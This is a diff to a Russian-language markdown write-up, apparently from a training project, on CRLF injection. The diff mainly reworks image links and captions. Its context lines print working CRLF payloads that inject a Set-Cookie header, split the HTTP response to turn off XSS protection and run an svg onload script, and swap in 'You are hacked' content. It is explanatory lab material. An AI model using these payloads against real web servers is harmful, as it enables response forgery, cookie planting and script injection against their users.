@@ -23,40 +23,41 @@ CRLF-injection представляет собой тип атаки, испол
 
 Для выполнения данной операции введем в заголовке следующее:
 `%0D%0ASet-Cookie:crlf_team=tanya_masha_denis_edik`
-![1.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/%D0%97%D0%B0%D0%BF%D1%80%D0%BE%D1%81%20%D0%B8%20%D0%BE%D1%82%D0%B2%D0%B5%D1%82%20%D1%81%20%D0%B4%D0%BE%D0%B1%D0%B0%D0%B2%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5%20cookie.png?raw=true)
 
-Рисунок 1. Запрос и ответ на добавление cookie
+![Запрос и ответ с добавление cookie.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Запрос%20и%20ответ%20с%20добавление%20cookie.png)
 
-![](https://github.com/karpuna3/shift2019/blob/master/crlf/img/%D0%A0%D0%B5%D0%B7%D1%83%D0%BB%D1%8C%D1%82%D0%B0%D1%82%20CRLF-%D0%B8%D0%BD%D1%8A%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%20%D1%81%20%D0%B4%D0%BE%D0%B1%D0%B0%D0%B2%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5%D0%BC%20cookie.png?raw=true)
+Рисунок 1. Запрос и ответ с добавлением cookie
+
+![Результат CRLF-инъекции с добавлением cookie.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Результат%20CRLF-инъекции%20с%20добавлением%20cookie.png)
 
 Рисунок 2. Результат CRLF-инъекции с добавлением cookie
 - Получение XSS
 
 Для достижения данной цели делаем все то же самое, что и в пункте 1 с той оговоркой, что необходимо после символа переноса строки использовать иные заголовки
 `12%0d%0aContent-Length%3A35%0d%0aX-XSS-Protection%3A0%0d%0a%0d%0a23%0d%0a%3Csvg%20onload%3Dalert%28document.domain%29%3E%0d%0a0%0d%0a%2F%2f%2e%2e`
-![](https://github.com/karpuna3/shift2019/blob/master/crlf/img/%D0%A0%D0%B5%D0%B0%D0%BB%D0%B8%D0%B7%D0%B0%D1%86%D0%B8%D0%B8%20CRLF-%D0%B8%D0%BD%D1%8A%D0%B5%D0%BA%D1%86%D0%B8%D0%B8%20%D0%B4%D0%BB%D1%8F%20XSS.png?raw=true)
+
+![Реализации CRLF-инъекции для XSS.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Реализации%20CRLF-инъекции%20для%20XSS.png)
 
 Рисунок 3. Реализации CRLF-инъекции для XSS
 
-![](https://github.com/karpuna3/shift2019/blob/master/crlf/img/%D0%A0%D0%B5%D0%B7%D1%83%D0%BB%D1%8C%D1%82%D0%B0%D1%82%20%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B5%D0%BD%D0%B8%D1%8F%20XSS.png?raw=true)
+![Результат получения XSS.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Результат%20получения%20XSS.png)
 
 Рисунок 4. Результат получения XSS
  - Замена информации полученной пользователем
  
- ![](https://github.com/karpuna3/shift2019/blob/master/crlf/img/%D0%98%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%86%D0%B8%D1%8F,%20%D0%BA%D0%BE%D1%82%D0%BE%D1%80%D1%83%D1%8E%20%D0%BF%D0%BE%D0%BB%D1%83%D1%87%D0%B0%D0%B5%D1%82%20%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%20%D0%B4%D0%BE%20%D0%BF%D0%BE%D0%B4%D0%BC%D0%B5%D0%BD%D1%8B.png?raw=true)
+ ![Информация, которую получает пользователь до подмены.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Информация%2C%20которую%20получает%20пользователь%20до%20подмены.png)
  
  Рисунок 5. Информация, которую получает пользователь до подмены.
 
 Меняем заголовок: `%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0aYou are hacked%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e`
 
-![](https://github.com/karpuna3/shift2019/blob/master/crlf/img/%D0%9F%D1%80%D0%BE%D1%86%D0%B5%D1%81%D1%81%20%D0%BF%D0%BE%D0%B4%D0%BC%D0%B5%D0%BD%D1%8B%20%D0%B8%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%86%D0%B8%D0%B8.png?raw=true)
+![Процесс подмены информации.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Процесс%20подмены%20информации.png)
 
 Рисунок 6. Процесс подмены информации
 
-![](https://github.com/karpuna3/shift2019/blob/master/crlf/img/%D0%A0%D0%B5%D0%B7%D1%83%D0%BB%D1%8C%D1%82%D0%B0%D1%82%20%D0%BF%D0%BE%D0%B4%D0%BC%D0%B5%D0%BD%D1%8B%20%D0%B8%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%86%D0%B8%D0%B8.png?raw=true)
+![Результат подмены информации.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Результат%20подмены%20информации.png)
 
 Рисунок 7. Результат подмены информации.
-
 
 ## Ущерб
 Данный тип атаки позволяет фальсифицировать данные в ответе от веб-сервера, добавлять cookie или даже отключать XSS-защиту для последующей более опасной атаки.
